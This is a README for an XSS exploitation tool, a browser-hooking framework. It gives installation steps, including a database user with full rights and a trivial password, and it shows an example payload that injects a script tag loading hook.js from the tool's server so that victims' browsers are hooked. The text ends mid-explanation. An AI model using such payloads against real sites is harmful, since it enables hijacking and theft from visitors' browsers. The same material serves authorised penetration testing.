# Installation

## Using Docker

Build the image:
```
$ docker-compose -f docker-compose.yml build
```

This will spin up the server and the database, visit the page http://localhost:8000 to see the XSS Exploitation Tool interface.

## On host

> Tested on Debian 12

### Get the sources

Install Git and pull the XSS-Exploitation-Tool source code:

```
$ sudo apt-get install git

$ cd /tmp
$ git clone https://github.com/Sharpforce/XSS-Exploitation-Tool.git
$ sudo mv XSS-Exploitation-Tool/* /var/www/html/
```

### Install the extensions

You may need Apache, Mysql database and PHP with modules:

```
$ sudo apt-get install apache2 default-mysql-server php php-mysql php-curl php-dom
$ sudo rm /var/www/index.html
```

Install composer, then install the application dependencies:

```
$ sudo apt-get install composer
$ cd /var/www/html/
$ sudo chown -R $your_debian_user:$your_debian_user /var/www/
$ composer install
$ sudo chown -R www-data:$www-data /var/www/
```

### Init the database

```
$ sudo mysql
```

Creating a new user with specific rights:

```
MariaDB [(none)]> grant all on *.* to xet@localhost identified by 'xet';
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> flush privileges;
Query OK, 0 rows affected (0.00 sec)

MariaDB [(none)]> quit
Bye
```

Creating the database (will result in an empty page): visit the page http://localhost:8000/reset_database.php

Visit the page http://localhost:8000 to see the XSS Exploitation Tool interface.

# How it works

Access the file `exploit.html`: http://localhost:8000/exploit.html or exploit a Cross-Site Scripting vulnerability to insert the Javascript hook file:

```
?vulnerable_param=<script src="http://localhost:8000/hook.js"/>
```

Then, when victims visit the hooked page, the XSS Exploitation Tool server should list the hooked browsers:
